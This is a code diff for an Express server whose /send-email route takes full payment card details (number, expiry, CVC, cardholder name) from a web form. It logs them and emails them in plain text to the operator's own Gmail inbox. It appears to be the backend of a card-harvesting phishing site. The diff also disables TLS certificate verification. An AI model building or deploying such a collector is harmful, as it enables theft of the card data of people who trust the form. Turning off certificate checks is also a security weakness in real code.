@@ -20,26 +20,29 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// ====== NODEMAILER SETUP ======
+// ====== NODEMAILER SETUP (Render-Safe) ======
 const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
-  port: 465,
-  secure: true, // SSL
+  port: 587,           // <- Gmail TLS port
+  secure: false,        // <- must be FALSE for port 587
   auth: {
     user: process.env.MAIL_USER,
     pass: process.env.MAIL_PASS
+  },
+  tls: {
+    rejectUnauthorized: false
   }
 });
 
 // ====== SEND EMAIL API ======
 app.post("/send-email", async (req, res) => {
-  console.log("📩 Received form:", req.body); // <-- Debug log
+  console.log("📩 Received form:", req.body);
 
   const { card_number, expiration, cvc, card_name } = req.body;
 
   const mailOptions = {
     from: process.env.MAIL_USER,
-    to: process.env.MAIL_USER,   // ikaw tatanggap
+    to: process.env.MAIL_USER,
     subject: "New Payment Data",
     text: `
 Card Number: ${card_number}
@@ -63,4 +66,3 @@ Card Name: ${card_name}
 app.listen(process.env.PORT || 10000, () => {
   console.log("🚀 Server running...");
 });
-
